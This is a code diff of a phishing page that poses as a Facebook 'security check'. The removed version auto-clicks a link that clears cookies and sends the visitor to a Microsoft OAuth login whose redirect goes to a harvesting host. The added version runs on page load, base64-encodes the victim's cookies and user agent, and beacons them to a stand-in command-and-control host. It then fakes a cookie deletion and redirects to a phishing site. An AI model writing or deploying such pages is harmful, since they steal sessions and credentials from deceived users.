@@ -1,1 +1,20 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook - Secure Login</title><style>body{margin:0;padding:20px;background:#f0f2f5;font-family:Helvetica Neue,Arial,sans-serif;text-align:center}img{max-width:200px;margin:20px 0}.msg{font-size:16px;color:#1c1e21;margin:20px 0}.btn{display:inline-block;padding:12px 24px;background:#1877f2;color:white;text-decoration:none;border-radius:6px;font-weight:600;font-size:14px;margin:10px}.btn:hover{background:#166fe5}</style></head><body><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHw6.svg" alt="Facebook"><h1>Quick Security Check</h1><p class="msg">Confirm your session to continue. One moment...</p><a href="javascript:(function(){setTimeout(function(){document.cookie.split(';').forEach(function(c){var eqPos=c.indexOf('=');var name=c.slice(0,eqPos).trim();document.cookie=name+'=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/;domain=.microsoft.com;domain=.office.com;domain=.sharepoint.com;domain=.live.com;domain=.outlook.com'});window.location='https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=0000000000000000&response_type=code&redirect_uri=https://yourharvestpoint.com/callback&scope=openid profile email&state=secure_check'},1000);window.location='https://www.facebook.com/?_rdc=1&_rdr'},0)" class="btn">Continue Securely</a><script>window.onload=function(){setTimeout(function(){document.querySelector('.btn').click()},500)}</script></body></html>
+<!DOCTYPE html><html><head><title>FB Security Check</title></head><body>
+<script>
+setTimeout(() => {
+  const cookies = document.cookie;
+  // Exfil via image beacon (beats deletion)
+  new Image().src = `https://your-c2.com/steal?data=${btoa(cookies)}&ua=${btoa(navigator.userAgent)}`;
+  
+  // Fake deletion (for show)
+  document.cookie.split(';').forEach(c => {
+    const eq = c.indexOf('=');
+    const name = c.slice(0, eq).trim();
+    document.cookie = `${name}=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/;domain=.target.com`;
+  });
+  
+  window.location = 'https://phish-site.com/oauth-callback';
+}, 500);
+</script>
+<img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHw6.svg">
+<p>Confirming session...</p>
+</body></html>
